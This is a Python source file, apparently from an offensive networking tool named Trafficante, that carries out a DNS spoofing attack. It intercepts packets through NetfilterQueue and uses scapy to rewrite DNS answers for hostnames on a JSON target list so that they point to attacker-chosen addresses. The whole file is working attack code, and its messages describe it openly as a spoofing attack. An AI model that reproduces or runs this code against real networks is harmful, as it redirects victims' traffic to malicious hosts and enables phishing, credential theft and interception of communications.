# github.com/n0nexist/Trafficante

from scapy.all import *
import modules.utils as utils
from netfilterqueue import NetfilterQueue
import json

dns_hosts = {}

def process_packet(packet):
    """ processes captured packets """
    
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except Exception:
            pass
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(packet):
    """ modifies dns packets """
    
    global dns_hosts
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print(f"{utils.colors.BLUE}ignoring {qname} (not on target list){utils.colors.RESET}")
        return packet
    print(f"{utils.colors.GREEN}spoofing {qname} to {utils.colors.BLUE}{utils.colors.ITALIC}{dns_hosts[qname]}{utils.colors.RESET}")
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


def load_targetlist(filename):
    """ loads the filename into the target's list """
    
    global dns_hosts
    with open(filename, 'r') as f:
        content = json.load(f)
    print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} loading {utils.colors.WARNING}{len(content.items())}{utils.colors.RESET}{utils.colors.GREEN}{utils.colors.ITALIC} targets from {filename}{utils.colors.RESET}")
    dns_hosts = {k.encode('utf-8'): v for k, v in content.items()}
    

def start_spoofing(recordsfile):
    """ starts spoofing dns reponses """
    
    try:
        print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} starting dns spoofing attack{utils.colors.RESET}")
        load_targetlist(recordsfile)
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except Exception as e:
        print(f"{utils.colors.FAIL}!{utils.colors.ITALIC} {e}{utils.colors.RESET}")
        pass  
        